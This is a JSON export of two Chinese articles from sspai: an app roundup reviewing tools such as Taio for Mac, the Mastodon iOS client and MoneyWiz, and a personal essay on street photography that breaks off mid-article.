[{"title":"派评 | 近期值得关注的 App","date":"2021-08-09 09:55:06","description":"\n<p>本期《派评》的主要内容有：</p>\n<ul>\n<li>强大的 iOS / iPadOS 文本处理工具 Taio 推出 macOS 版本。</li>\n<li>去中心化社交网络平台 Mastodon 推出官方客户端。</li>\n<li>故事织机：好用的移动端小说创作工具。</li>\n<li>MoneyWiz：老牌记账工具更新多项实用功能。</li>\n<li>……</li>\n</ul>\n<p>你可以通过文章目录快速跳转到你感兴趣的内容。如果发现了其它感兴趣的 App 或者关注的话题，也欢迎在评论区和我们进行讨论。</p>\n<h2>不容错过的新 App</h2>\n<h3>Taio：强大的文字处理工具，推出 macOS 版本</h3>\n<ul>\n<li>平台：macOS / iOS / iPadOS</li>\n<li>关键词：Markdown、剪贴板、编辑器</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Vanilla\" user-id=\"bs2ov5lb34tch278f9ag\" href=\"https://sspai.com/u/whoops\">@Vanilla</a>：在经过 Pin、JSBox 等 App 的开路后，Taio 作为一款集剪贴板、编辑器和文本动作于一身的全能工具，在 iOS 端一经发布后就广受赞誉。虽然先前 Taio 迟迟没有发布原生 macOS 应用，但很多 M1 电脑用户都喜欢通过非官方支持的方式 sideload 以在桌面端使用 Taio。近日，开发者终于推出了基于 Intel + Apple Silicon 的 Universal 架构上的 Mac 应用，让用户可以获得稳定高效的使用体验。</p>\n<p>整体而言，Taio 的 macOS 版功能与 iOS 版基本一致，老用户完全没有学习成本。对于新用户来说，剪贴板、编辑器和文本动作三个模块配合引导内容，也足够简单易上手。</p>\n<p>Taio for Mac 的剪贴板会自动读取系统剪贴板，也可以手动添加内容，并且可以通过 iCloud 进行设备间的同步。对于剪贴板上的内容，除了基础的复制、分享等操作，Taio 还可以使用动作库里的动作对其进行搜索、翻译、引用、合并或者其他你自定义的操作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f0qtb34tcdnn5b4a0.png\"></figure><p>Taio for Mac 的编辑器也足够好用，完全可以和其它老牌 Markdown 编辑器处于同一梯队。首先，Taio 采用了开放的文件系统，所有内容都可以被其它编辑器直接读写。另外，Taio 支持 CommonMark 和 GitHub Flavored 标准，还可以编辑数学公式和绘制图表，在确保功能全面的基础上兼顾了兼容性。</p>\n<p>值得一提的是，Taio 在大纲、预览、双向链接、网络视图等方面的支持也非常到位，配得上一个专业编辑器的称号。当然，Taio 的编辑器也支持动作库的动作，可以快速进行插入中英文空格、格式美化、整理段落、大小写转换等丰富的操作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f0rdb34tcdd5rnqm0.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f0rtb34tcdj3korig.png\"></figure><p>Taio for Mac 的动作库在 Mac 端获得了更好的编辑体验。我们可以在界面上通过更合理的分区和更快捷的拖拽操作来提高编辑效率。可视化的编辑器也让代码小白可以更加直观地入门编写基于 JavaScript 的动作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f0s5b34tcditlgkfg.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f0sdb34tcdj3korj0.png\"></figure><p>你可以在 <a href=\"https://apps.apple.com/cn/app/taio-markdown-%E7%BC%96%E8%BE%91%E5%99%A8%E5%92%8C%E5%BF%AB%E6%8D%B7%E5%8A%A8%E4%BD%9C/id1527036273\" target=\"_blank\">App Store</a> 下载 Taio for Mac，年订阅售价 108 元，永久买断版本售价 248 元。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/68179\" target=\"_blank\">文字处理工具 Taio 发布 Mac 版本</a></p>\n<span class=\"ss-application\" app-id=\"15830\"> </span><h3>Mastodon：去中心化社交网络平台，推出首个官方客户端</h3>\n<ul>\n<li>平台：iOS</li>\n<li>关键词：社交网络</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@化学心情下2\" user-id=\"bs2od75b34tch2730oa0\" href=\"https://sspai.com/u/liuxiaofengone\">@化学心情下2</a>：相比 Twitter、Facebook、微博这样的大型公共社交网络，Mastodon 的运营模式更为特殊，它更像是早年小众论坛的「社交网络重制版」，对于希望和同好而不是陌生人进行交流的朋友而言，这种去中心化的网络更注重隐私，更像是我们常说的熟人小圈子社交。</p>\n<p>不过 Mastodon 一直以来因为其去中心化，因此都没有推出过官方客户端，这在这个社交全靠手机的时代似乎有些「格格不入」，好在最近其终于推出了官方的客户端，即便是一个 Mastodon 新手也可以快速上手。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f0stb34tcdd5rnqmg.png\"></figure><p>应用使用起来其实也颇具Mastodon 特色：相比其他家社交网站 App，注册和登录 Mastodon 的第二步则是选择你想要加入的服务器，这也是 Mastodon 和其他社交网站平台所不同的地方——用户需要选择自己希望加入的「圈子」，而不是等待平台给你推荐想要关注的人。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f0t5b34tcditlgkg0.png\"></figure><p>选择好服务器并登录之后，你就可以加入并参与到当前的 Mastodon 服务器的社交讨论了，而这个信息流的展现形式也和 Twitter 颇为相似，你可以关注你感兴趣的人、发表你的观点或者转发别人的信息——实际用起来和 Twitter 还是比较类似的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f0tdb34tcdd5rnqn0.png\"></figure><p>要说到和 Twitter 唯一的区别，可能就是所谓的跨节点关注了，由于 Mastodon 是一个去中心化的社交网络，实际上大家注册的只是某个 Mastodon 服务器节点的账户，但你依旧可以关注其他服务器上的 Mastodon 用户，当然相比 Twitter 的推荐算法，Mastodon 想要关注你所感兴趣的外服用户可能要折腾一番。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f0ttb34tcdd5rnqng.png\"></figure><p>如果你目前正在使用 Mastodon 并使用第三方的客户端，那么不妨试试这个官方推出的 Mastodon for iOS 客户端，目前已经在 <a href=\"https://apps.apple.com/cn/app/mastodon-for-iphone/id1571998974\" target=\"_blank\">App Store</a> 提供免费下载。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/46868\" target=\"_blank\">更加开放的社交网络，「长毛象」让你自由地分享想法</a></p>\n<span class=\"ss-application\" app-id=\"16133\"> </span><h3>故事织机：随手写出你想象中的世界</h3>\n<ul>\n<li>平台：Android / iOS</li>\n<li>关键词：小说、写作</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Noah_Choi\" user-id=\"bs2oudlb34tch2787tn0\" href=\"https://sspai.com/u/69zxdqx8\">@Noah_Choi</a>：相信以前的你会在被窝里偷偷地看小说，然后幻想自己是里面的主人公惩恶扬善、天降正义，那你有没有想过自己写一部小说或者舞台剧？试试故事织机这款 App 吧，它提供了非常全面的写作引导，你只需要稍加润色，就可以利用它将零碎素材拼凑成一部完整作品了。</p>\n<p>故事织机分为两个功能模块：素材本和剧作本。素材本顾名思义就是存放素材的地方，我们可以把偶尔迸发的灵感扔进这里，可以是角色、故事情节，或者是一场大战描述和结尾的升华，每一个素材都可以归属于一个文件夹，并配置不同颜色用以区分，比如角色用白色表示、关键情节用红色表示。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f0v5b34tcditlgkh0.png\"></figure><p>随着日积月累，素材慢慢变多，这些素材能够直接拼凑起来形成剧作，于是我们就来到了剧作本模块。使用剧作本时要选择内容篇幅，故事织机会根据篇幅不同而提供有针对性的描述引导。如果你是在素材本里选择「以素材制作故事情节」，就一步步根据引导去选择角色、情节、转折等等内容，完成后就来到了这部作品的故事情节页面。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f0vtb34tcditlgkhg.png\"></figure><p>故事情节页面中已经填充好了刚才你选择的内容，每一项内容里由有着更为详细的描述，对于舞台剧或者小剧本来说，这里还可以完善分镜和台词。一个故事一定要有世界观和人物关系，所以就需要切换故事情节页面上方的不同标签去描述世界观、角色的背景故事、创作出发点甚至是你独特的想法等等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f105b34tcdnn5b4b0.png\"></figure><p>故事织机并非一个写作工具，而是一个故事创作的收集和引导工具，你只要有想法，就可以利用它去创作出一个独一无二的奇幻世界。现在，你可以在 <a href=\"https://play.google.com/store/apps/details?id=com.hhatamanga.storyplotter&amp;hl=zh&amp;gl=US\" target=\"_blank\">Google Play</a> 和 <a href=\"https://apps.apple.com/cn/app/%E6%95%85%E4%BA%8B%E7%BB%87%E6%9C%BA/id1491980862\" target=\"_blank\">App Store</a> 免费下载故事织机，并根据应用内引导找到桌面端的使用方式。</p>\n<span class=\"ss-application\" app-id=\"16135\"> </span><h3>Tilla：清楚掌握你的服务订阅情况</h3>\n<ul>\n<li>平台：Android</li>\n<li>关键词：订阅管理</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Peggy_\" user-id=\"bs2p015b34tch278nkdg\" href=\"https://sspai.com/u/5isr02uh\">@Peggy_</a>：随着越来越多的服务乃至应用开始采用订阅制度，各不相同的订阅金额、扣款时间很容易就会让我们对自己的财务状况失去掌控。要么不知道钱花在了哪里，每个月糊里糊涂续了费，要么就是被看似便宜的订阅价格诱惑，不知不觉中越订越多。为了避免这种情况，我们可以使用专门的订阅服务管理应用来监测自己的服务订阅情况。</p>\n<p>Tilla 内置了一个包括 Apple Music、Dropbox、Netflix 等常见订阅服务在内的列表,如果其中包含你正在使用的订阅服务，你只需要挑选并设置相应的付费时间即可。如果这个列表里没有你正在使用的订阅服务，你也可以手动自行添加。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f10lb34tcdnn5b4bg.jpeg\"></figure><p>添加相应的服务时，你可以对名称、图标、颜色等进行自定义，并对金额、币种、扣款日期、付费周期以及订阅类别等进行详细设置。此外，如果你希望在下次付费前收到提醒，还可以打开「接收提醒」并选择希望收到提醒的确切时间。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c48f10tb34tcdd5rnqo0.jpeg\"></figure><p>添加好你的所有订阅服务后，你可以通过点击主界面的「总计开销」清楚地看到每周、每月或每年你所需要花费的总金额，目前此处仅支持以美元显示，相信后期随着开发者对应用的不断完善，我们便能自定义显示币种了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f11db34tcdd5rnqog.jpeg\"></figure><p>Tilla 目前分为普通版和高级版，普通版仅包含基础功能，并限制了添加订阅的数量，高级版则不无此限制，并额外提供深色模式与跨设备同步选项，其中跨设备同步默认利用 Google 云盘进行。</p>\n<p>你可以通过 <a href=\"https://play.google.com/store/apps/details?id=com.pavelrekun.tilla\" target=\"_blank\">Play Store</a> 下载体验 Tilla 免费版，或是直接 <a href=\"https://play.google.com/store/apps/details?id=com.pavelrekun.tilla.premium\" target=\"_blank\">购买</a> Tilla 高级版。</p>\n<span class=\"ss-application\" app-id=\"16136\"> </span><h3>Coaster：第三方 Unsplash 客户端新选择</h3>\n<ul>\n<li>平台：macOS / Windows</li>\n<li>关键词：无版权图库、壁纸</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@红酒皇\" user-id=\"bs2p85tb34tcs0pmdeeg\" href=\"https://sspai.com/u/Fabrina\">@红酒皇</a>：我们常常碰到这种时候，比如在发朋友圈时想要配一张相关的照片，或发表文章需要插入图片增加可读性，想要找到不太俗气的图片可却无从下手，从几大知名网站中看中的图片却又价格高昂。Coaster 为这种困境提供了解决方案，它能够在 Unsplash 中搜索免费的无版权照片与合集，让人快速找到符合心意的配图。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/b8e4a876374778bdc718758beafbb615.png\"></figure><p>Coaster 的界面清晰，结构简单，打开后只需要在搜索栏中输入关键词，就可以直达图片或合集列表。选中图片后，Coaster 还提供了几个实用的快速操作：</p>\n<ul>\n<li>一键更换桌面；</li>\n<li>复制到剪贴板；</li>\n<li>下载高清图片；</li>\n<li>在 Unspalsh 中打开。</li>\n</ul>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/09/f7cc06e85b67aae106ba34c09eb336aa.gif\"></figure><p>除此之外，你还可以直接把图片拖拽到应用窗口中的目标位置，省去调整布局的繁琐操作。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c48f125b34tcditlgkig.gif\"></figure><p>你可以在 <a href=\"https://heycoaster.com/#\" target=\"_blank\">官网</a> 免费下载 Coaster，并在 Mac 或 Windows 设备上使用，但目前 Coaster 暂不支持移动设备。</p>\n<h2>值得关注的 App 更新</h2>\n<h3>MoneyWiz 2021：新的通知选项和视觉改善</h3>\n<p><a class=\"ss-atUser\" data-mention=\"@huhuhang\" user-id=\"bs2ovedb34tch278htb0\" href=\"https://sspai.com/u/huhuhang\">@huhuhang</a>：MoneyWiz 2021 作为一款面向偏专业用户的财务管理工具近期又推出了多个重要更新。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f12db34tcditlgkj0.png\"></figure><p>首先是 iOS 和 iPadOS 版本新增了 2 个小部件，分别小、中尺寸的预算余额，方便随时关注预算的变化情况。同时，菜单栏中新增了通知选项，方便更细致化地管理通知消息。如果添加了银行自动同步的帐户，MoneyWiz 支持对新交易进行通知，同时还可以在指定时间点提醒你不要忘记整理账目。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f12tb34tcdj3kork0.png\"></figure><p>如今，除了查看投资账户的全部佣金数据，还可以在账户统计信息卡中查看年度总佣金了。与此同时，MoneyWiz 改善了多处界面样式，包括帐户余额小部件的视觉改进，以及新的类别、帐户和预算图标。此外，表格模式下交易状态的形状和颜色也针对色盲人士进行了优化。</p>\n<p>有兴趣现在就可以到 <a href=\"https://apps.apple.com/cn/app/moneywiz-2021-%E4%B8%AA%E4%BA%BA%E8%B4%A2%E5%8A%A1/id1511185140\" target=\"_blank\">App Store</a> 和 <a href=\"https://apps.apple.com/cn/app/moneywiz-2021-%E4%B8%AA%E4%BA%BA%E8%B4%A2%E5%8A%A1/id1511185140\" target=\"_blank\">Mac App Store</a> 中下载试用 MoneyWiz 2021，新注册用户可以免费体验 7 天，同时可以按月度或者年度付费订阅。</p>\n<p>你可以在 少数派 <a href=\"https://sspai.com/item/64#345\" target=\"_blank\">购买 MoneyWiz 年订阅版本</a>，年订阅版本不仅赠送专属教程，还可以在 MonwyWiz 2021 上激活使用。</p>\n<span class=\"ss-genuineSoftware\" product-id=\"64\" type=\"genuineSoftware\"> </span><h3>不咕剪辑 1.6.5：加入专业时间线和关键帧功能</h3>\n<ul>\n<li>平台：iOS / iPadOS</li>\n<li>关键词：视频剪辑</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Snow\" user-id=\"bs2od75b34tch2730o80\" href=\"https://sspai.com/u/ul0vcezb\">@Snow</a>：这段时间，擅长制作抠像视频的《<a href=\"https://sspai.com/post/63219\" target=\"_blank\">不咕剪辑</a>》孜孜不倦地更新了好几个版本，版本号变动虽不大，功能性却实打实向着专业方向演进了。</p>\n<p>首先，新版不咕在时间线功能上有了巨大的升级。在旧版中，当轨道层级增加时，主轨道外的内容就会被压缩成一条彩色细线，看起来虽然很简洁，但对于后续操作来说却并不直观。新版不咕会让所有视频素材都以缩略图形式展现，只有贴图和文字元素的时间线会被压缩。如果你想获得完整的时间线预览，点击时间线左上角的「展开」按钮，则可以让所有元素的预览都完整显示，剪辑时更为清晰。</p>\n<p>时间线一复杂，层级逻辑就成了头疼的事。大部分移动端剪辑应用并不支持展现层级的变更，只能通过复制相同图层实现，又或是输入层级编号来调整顺序，调整之前还得在脑子里算个数。不咕的操作直截了当，和桌面端一样，直接通过拖拽调节层级，而且支持主轨道操作，谁前谁后一拖了事。</p>\n<p>为了提高时间线的效率，应用将常用的剪辑、复制、删除功能独立在底部的剪辑快捷栏中，你只需选择轨道，移动标尺，就可以通过快捷按钮直接进行剪辑，而无需「选-剪-选-删」地多次操作，当你长按时间线区域左右拖拽时，应用还可以实现逐帧跳转，在这两个新功能的加持下，在移动端既高效又精准的剪辑也不是不可能实现嘛。</p> <p>说到「帧」的概念，新版应用中还加入了关键帧功能，你可以利用关键帧自定义更为复杂的动画效果，无论是轨迹运动、色彩变化还是蒙版效果，在关键帧的加持下都有了更大的自主权，可玩性也大幅提升。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/96cba2ca0b22eb2d1af769df4ea09eb9\"></figure><p>在不咕剪辑最擅长的「抠像」领域，它也玩出了新花样，他不仅能自动抠出人物素材，还能更精细地抠出「头像」元素。你可以利用这一功能尝试惊悚的人头气球、搞怪的大头特效、魔性的换头视频等等，伊藤润二都直呼内行。</p>\n<p>你可以在 <a href=\"https://apps.apple.com/cn/app/%E4%B8%8D%E5%92%95%E5%89%AA%E8%BE%91-%E6%97%A0%E5%B9%BF%E5%91%8A-%E8%BD%BB%E6%9D%BE%E5%89%AA/id1528288216\" target=\"_blank\">App Store</a> 免费下载《不咕剪辑》。</p>\n<span class=\"ss-application\" app-id=\"15780\"> </span><h2>App 速报</h2>\n<ul>\n<li>Day One（<a href=\"https://help.dayoneapp.com/en/articles/5403308-conceal-content-for-additional-privacy\" target=\"_blank\">iOS | macOS</a>）：更新至 v6.7，加入一项新功能：隐藏日记，通过按钮可以快速将应用上呈现的内容隐藏起来，从而避免在公共场所时被人偷窥到相关的内容。</li>\n<li>Ulysses（<a href=\"https://apps.apple.com/cn/app/ulysses/id1225571038?ign-mpt=uo=4\" target=\"_blank\">iOS | macOS</a>）：更新至 v23，针对博主带来诸多新特性，在文稿列表中，已发布的帖子会带有一个小的纸飞机图标，方便进行查看；操作面板中新增的小组将将显示帖子的发布状态、选择的博客平台以及上传日期；Ghost 用户现在可以更新之前发布的帖子。上传到 WordPress、Ghost、Micro.blog 和 Medium 等平台的帖子的发布状态现在可以在您的所有设备上同步，同时调整了群组写作目标的会话历史。</li>\n<li>CrossOver（<a href=\"https://www.codeweavers.com/crossover\" target=\"_blank\">macOS | Linux | Chrome OS</a>）：更新至 v21，基于 Wine 6.0，包含用于 Direct3D、DirectShow 和 Media Foundation 的新的 Vulkan 后端，针对 Mac 还有诸多改进，例如现在支持深色模式，Xbox Series X 和 PS5 的控制器现在可以通过蓝牙在 macOS BIg Sur 11.3 上使用.</li>\n<li>Affinity（<a href=\"https://affinity.serif.com/zh-cn/latest-update/?utm_medium=email&amp;utm_source=serifemail&amp;utm_campaign=1-10_Launch_Campaign_202108&amp;mc=110LaunchECE01\" target=\"_blank\">macOS | Windows | iPad</a>）：全部套件更新至 v1.10，Affinity Publisher 在本次更新中优化了内存管理、IDML 导入的速度提升了多达四倍；Affinity Photo 中图层混合的方式进行了调整，即便高度复杂的作品也能保证无损工作流；Affinity Designer 的渲染引擎优化速度是以往的数十倍。</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68188"},{"title":"在街头摄影，也在街头做一个讲故事的人","date":"2021-08-09 08:05:31","description":"\n<p>今年年初的时候，为了构思一篇公众演讲，破天荒的有机会回忆起了一些陈年老故事。演讲拟定的主题是【Unlock the hidden menu in life】，里面用这个主题串联了几个以前发生在我身上很美妙的事（至少我是这么认为），其中一个就是我是怎么走上摄影这条<s>不归</s>路的。</p>\n<p>今年疫情期间有大把的时间在家里，我完成了纽约摄影学院职业摄影师的在线课程，一方面是想要系统的了解摄影，另外一方面为了敦促自己能够对于摄影有更深刻的思考。在课程的最后单元，介绍了不同风格的摄影：婚礼、街头、自然风光、人像、商业等等。最重要是要找到自己心之所向的摄影方式，能够养活自己是一方面，如果只是所谓爱好的话，能够让自己快乐是终极原则。所幸，我的快乐在于观察人类，街头摄影占据了我大概 60% 的快门数量。</p>\n<p>虽然不是专业摄影师，但是对于街头摄影这件事，我也想谈谈我的一些经验与看法，也欢迎大家来探讨和指正。</p>\n<h2>如果要等，不妨等久一点</h2>\n<p>也许大家看过很多街头摄影的 vlog，能够看到摄影师总是穿梭在街道上，快速的按着快门捕捉着看到的一切，这当然很大程度上取决于摄影师的经验。要知道，还有一类摄影师，例如 Vincent Laforet，一旦找到了一个满意的场景，会在那里蹲几个小时，等待合适的人/物进入取景器的视野。这样的拍摄方式，就好像摄影师大胆的给这个世界出了一道填空题，然后等待世界给他安排一个正确的答案。诚然，不是所有的题都会得到一个满意的答案，但是，一旦拥有了正确答案的摄影师，其本身获得的满足一定是超乎寻常的，大约属于「延迟满足」的感觉。而在这样的场景下，等久一点，得到正确答案的几率就大一些。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/20/0587974f7eeed1cfaa27a0437f720eb4.jpg\"><figcaption>小女孩与打烊的冰淇淋车</figcaption></figure><p>这张照片就是我在晚上十点多钟蹲守在冰淇淋车对面拍到的画面。首先，这至少是一辆很好看的冰淇淋车，复古的造型，全景大玻璃窗，淡黄色车身。其次，它引发了我的思考，究竟什么样的人会适合在这辆车前面经过呢？而这期间，陆陆续续的从这辆车前面走过了很多的人，在我低头看向取景器的一霎那，发现了这个抱着毛绒玩具的小女孩，就果断按下了快门。小女孩看向打烊的冰淇淋车的眼神，虽然在照片里看不到，但已经写在了整个场景里。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/20/9a852c3a26e00530fd867ec10bd1d97a.jpg\"><figcaption>美术班请上二楼</figcaption></figure><p>这张照片里的路牌可能已经暴露了这张照片是在哪里拍的，是我在庙前喝完酒之后出来溜弯路过的一个门。当时觉得这个铁门设计的非常有趣，被刷成了蒙德里安的画的样子，整体的风格和美术培训室这个设置非常搭。显然我不是唯一一个觉得这个铁门有趣的人，不信你看照片里的三位。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/5507cb36c69a1c38f7783659051689c5.jpg\"><figcaption>Encounter</figcaption></figure><p>这张照片拍摄于青海湖。当时看到了从湖边骑马过来的人，觉得和景色还蛮搭，但是有有些单调，然后回头一看，有个旅客刚下车往湖边走，我就耐心的等他们两个相遇的时候按下了快门。照片拍出来会给人一种想象空间，会让人好奇，这位姑娘也许会和骑马人进行一段有趣的对话。比如：</p>\n<blockquote>\n<p>姑娘：前面就是青海湖嘛？</p>\n<p>骑马人：不然呢？</p>\n</blockquote>\n<p>再比如：</p>\n<blockquote>\n<p>骑马人：骑马拍照 50 一张</p>\n<p>姑娘：便宜点</p>\n</blockquote>\n<h2>照片里的温度</h2>\n<blockquote><p>如果摄影是你表达自我的途径，那么构图就是用于清晰地（确切的说，是流畅地）表达自我的交通工具。构图是把观看者带入照片的途径，使他们保持足够持久的注意力，以读懂你的表述内容，并明确自己的感受。</p></blockquote>\n<p>构图一直以来是各种摄影教程里强调的最重要的内容，这件事情本身并没有错，然而在我看来，构图的结构化被过分的强调了。固然，结构化构图对于摄影初学者来说，能快速的提高成片质量。但是，当拍了一定数量的照片之后，渐渐构图就变成了像语言一样自然而然用于照片表达的一种形式。在这种时候，能够符合你阐述主题的构图可能并不能被结构化的构图套路所解释。</p>\n<p>光影，对于街头摄影的表达来说也是非常重要的。光的温度、角度以及折射在物体的各种形状，本身就是摄影的最大乐趣之一。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/90870dced34a154c52ac603d55153764.jpg\"><figcaption>夕阳下的情侣</figcaption></figure><p>这张照片拍摄于德国科隆的夏天，是我非常喜欢的一张照片。当时的我本来在蹲点拍着科隆大教堂的日落时分，正好看到这对情侣坐在台子上喝酒聊天觉得他们的背影非常适合作为前景放入照片中。夕阳的光把两个人的轮廓勾勒了出来，身后的酒瓶和缝隙中的莱茵河以及河对岸的教堂都成为了服务于这个场景的一部分，传达出了一种非常惬意的感觉。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/d9c675f539aa34caa7783f149eb06705.jpg\"><figcaption>逆光骑士</figcaption></figure><p>其实我对夕阳是由一些情有独钟的，也许是因为光线的温暖的颜色，也许是因为光线的柔和。我喜欢世间万物被打上一层金光的样子，在我看来这并不是一天即将结束的最后荣光，而是让我能够对明天更有期待的一个预告片。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/a010e1ebd9c8ad7fb1f5abcae22d1f1b.jpg\"><figcaption>冷暖对比中的忙碌</figcaption></figure><p>这张照片背后其实有一个故事。当时我和朋友在这家店吃肠粉，旁边一个老阿姨看到我背着相机，就拍了拍我的肩膀跟我说：小伙子你跟我来。把我带到了能够看到后厨的这个位置，开始不厌其烦又絮絮叨叨的给我讲怎么调整参数来拍出肠粉刚蒸出来时候的锅气，还用她手里的机器来给我示范。我耐心的听她讲，心想这个老阿姨可真可爱啊。老阿姨走后，我尝试着站在她的角度，只不过我没有把重点放在锅气上面，而是拍下了冷暖对比的场景。</p>\n<h2>决定性瞬间</h2>\n<blockquote>\n<p>摄影与绘画不同，拍摄的那一秒是个充满创造力的瞬间，你所构建和表达的是生活本身所提供给你的，并且你必须凭直觉判断何时按下快门。按下快门的那一瞬，便是摄影师所创作的，哦......是的，就是那一瞬！一旦你错过，它将不复存在。</p>\n<p>                                                                                                                     - 布列松</p>\n</blockquote>\n<p>我一直认为街头摄影的魅力在于它的纪实性。拍出来的不是经过精心布光细心搭建的场景，而是街头那匆忙地、不可复制地、值得铭记的一瞬。另外一位摄影师也说过，最好的相机就是你带在身上那一台，这也在一定程度上佐证了这一观点。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/26bc34309a3c671d7984609c11ec6693.jpg\"><figcaption>Jump</figcaption></figure><p>广场上一群孩子们正在玩儿肥皂泡。处在当时当下的我，其实非常享受在那个场景里，我坐在广场的地上，晒着太阳，时不时的拿起相机拍一拍跑来跑去的孩子们，这张照片就诞生了，小男孩触碰到肥皂泡的一瞬。这样的瞬间，如果没有影像记录的话，是很难在脑海中构建出如此具象的画面的。小男孩跳起来的时候，左手用力的张着，仿佛要摆脱地心引力，右手竭力的打破那个巨大的泡泡，而泡泡本身破碎的一瞬，也是肉眼难以记录的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/31/6e7323abff2c8dcf58722cc823e94140.jpg\"><figcaption>玩儿泡泡什么的最快乐了</figcaption></figure><p>和上面一张同一时段拍下的还有这一张，这张照片更多的是传达一种快乐的情绪。我们镜头中其实是很难捕捉到「情绪」这个略显虚无缥缈的词的。历史上也有很多著名的照片，比如「愤怒的丘吉尔 (The Roaring Lion)」表达的是愤怒。情绪通常在毫无防备下或者是无法掩饰的情况下才能被捕捉到，而随着年岁长大，我们掩饰情绪的能力也越来越高超，所以，能够捕捉到这样的场景真的是一件非常棒的一件事。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/12052e920e37e07b2aee7ceb31c1b7cf.jpg\"><figcaption>Kiss</figcaption></figure><p>情侣接吻似乎是街头摄影永恒的主题，尤其是在 Alfred Eisenstaedt「胜利之吻」之后。这张照片和那样的场景比起来，历史意味少了一些，但这丝毫不影响「接吻」这一主题传达出来的亲密与喜悦的情感。而有趣的是，这对情侣在自拍两人接吻，而我在拍他们自拍他们两个人接吻，颇有一种「你站在桥上看风景，而看风景的人在楼上看你」的意味。</p>\n<h2>直面陌生人的心理建设</h2>\n<p>街头摄影里面经常会被人提到的一个词就是「入侵」。相机背后的我们在通过镜头去记录世界的同时，被摄者常常会有一种被侵犯的感觉，尤其是你手中的相机不是那么 subtle 的时候。其实换位思考来看，如果我是被摄者，那么就很容易去理解这种入侵性了。</p>\n<p>通常应对这种情况，有两种方案。其一，让你的街拍设备尽量不显山不露水，越小的相机给人感觉上的入侵性越小。其二，把被摄者在感受到入侵性的瞬间作为你作品的一部分。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/bf696ccb595e5450029b4f3cbfa42943.jpg\"><figcaption>让我再看你一眼</figcaption></figure><p>这张照片拍摄于巴塞罗那的街头，我当时坐在长椅上休息，看着广场上的人，这个外卖小哥路过的时候我拍下了这张照片，小哥看到了我在拍他，我也看到了他看到了我在拍他，我已经做好了准备和小哥进行一番灵魂交流，不过小哥也并没有说什么。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/f91799d3c03b9540a8f23ce79b4cea15.jpg\"><figcaption>你大爷还是你大爷</figcaption></figure><p>这张拍摄于慕尼黑的街边咖啡馆。当时正在找吃饭的地方，路过这个大爷，觉得大爷十分酷直接举起相机拍了一张。拍完之后，和大爷打个友好的招呼。通常这种情况，如果碰到比较健谈的人，会直接引出一段友好的聊天。那么，问题的关键似乎就在于，你敢不敢举起相机按下快门踏出第一步。</p>\n<figure class=\"image ss-img-wrapper\"><img 